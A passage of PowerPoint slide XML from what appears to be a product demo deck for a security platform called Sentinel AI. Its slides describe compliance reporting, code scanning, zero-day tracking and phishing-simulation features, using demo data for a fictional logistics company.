          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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44000" y="2121408"/>
            <a:ext cx="2880360" cy="54864"/>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0" y="2194560"/>
            <a:ext cx="2880360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🛡</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9253728" y="2743200"/>
            <a:ext cx="2660904" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compliance Status
Report</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="3236976"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ●  Who it's for: compliance team, auditors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="3474720"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Per-framework passing / failing control counts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="3712464"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Full control evidence table with status dates</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="3950208"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Gap analysis: failing controls with owner names</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="4187952"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Audit timeline: last review, next review dates</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="4425696"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Remediation roadmap with estimated completion</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235440" y="4663440"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  ISO 27001 · SOC 2 · PCI-DSS v4.0 · GDPR covered</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Rectangle 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9253728" y="5760720"/>
            <a:ext cx="2660904" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="061A13"/>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3728" y="5779008"/>
            <a:ext cx="2660904" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⬇  Generate &amp; Download PDF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Rectangle 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6126480"/>
            <a:ext cx="11731752" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="191303"/>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5760" y="6217920"/>
            <a:ext cx="11457432" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Demo Seeding (also on this page): Seed Exploit Data inserts 2024 CVEs + exploit history; Seed Threat Intel populates dark web findings, threat actor profiles, and EPSS scores; Seed Compliance creates ISO 27001, SOC 2, PCI-DSS control records with pass/fail status. All seeding is idempotent — safe to run multiple times. Useful to reset after a live demo.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64008" cy="6858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960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D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9262872" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Additional Modules</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="594360"/>
            <a:ext cx="9262872" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12 more pages — Code Scanning · Zero-Day · Phishing · Infrastructure · Cloud · Container · Identity · DevSecOps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9537192" y="201168"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051A10"/>
          </a:solidFill>
          <a:ln w="508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19456"/>
            <a:ext cx="2450592" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🚢  GlobalShip Logistics  ·  Live Demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1024128"/>
            <a:ext cx="11731752" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sentinel AI includes 30+ specialised pages beyond the core modules. Every page below is populated with live GlobalShip Logistics data and fully navigable during the demo.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1417320"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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1417320"/>
            <a:ext cx="3837432"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508760"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Code Scanning</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1764792"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ SAST alerts from GitLab SAST and GitHub Advanced Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2002536"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Shows severity, rule ID, file path, and line number for each finding</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2240280"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Filters by severity, repository, programming language, and date</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2478024"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Links each alert to the relevant CVE in the vulnerability database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2715768"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Drill-down to full alert detail with code snippet and fix suggestion</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4139184" y="1417320"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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39184" y="1417320"/>
            <a:ext cx="3837432"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0624" y="1508760"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Zero-Day Tracker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="1764792"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Monitors newly published CVEs with no patch yet available (0-day status)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="2002536"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Tracks when a PoC (proof of concept) exploit appears on GitHub or ExploitDB</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="2240280"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ EPSS spike detection — alerts when a CVE's score jumps &gt;20% in 24 hours</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="2478024"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Auto-escalates to the Exploit Lab when EPSS exceeds 80% threshold</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="TextBox 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="2715768"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Shows affected assets immediately so the team knows exposure before a patch exists</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rectangle 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8049768" y="1417320"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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49768" y="1417320"/>
            <a:ext cx="3837432" cy="457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41208" y="1508760"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phishing &amp; Social Eng.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="1764792"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Run phishing simulation campaigns targeting specific employee groups</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="TextBox 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="2002536"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Tracks open rate, click rate, and credential submission rate per campaign</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="2240280"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Employee awareness scoring per department — identifies high-risk groups</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="2478024"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Template library: spearphishing, vishing scripts, smishing, QR code lures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
